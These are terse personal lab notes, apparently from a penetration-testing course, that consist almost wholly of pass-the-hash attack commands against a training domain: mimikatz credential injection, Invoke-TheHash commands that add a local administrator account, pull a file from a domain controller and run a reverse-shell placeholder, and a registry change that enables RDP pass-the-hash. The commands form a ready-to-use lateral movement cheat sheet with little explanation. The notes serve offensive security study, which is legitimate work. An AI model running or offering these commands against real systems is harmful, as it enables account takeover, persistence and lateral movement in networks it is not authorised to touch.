
```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
https://github.com/gentilkiwi
![[Pasted image 20240915152516.png]]

```powershell-session
Import-Module .\Invoke-TheHash.psd1



Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

Invoke-SMBClient -Domain inlanegreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Action Get -Source \\DC01\david\david.txt


```
https://github.com/Kevin-Robertson/Invoke-TheHash
![[Pasted image 20240915152921.png]]

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "PUT_REV_SHELL_HERE"
```
![[Pasted image 20240915152940.png]]

Enabling RDP PTH
![[Pasted image 20240915160815.png]]```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```

Extra Notes:
![[Pasted image 20240915161157.png]]


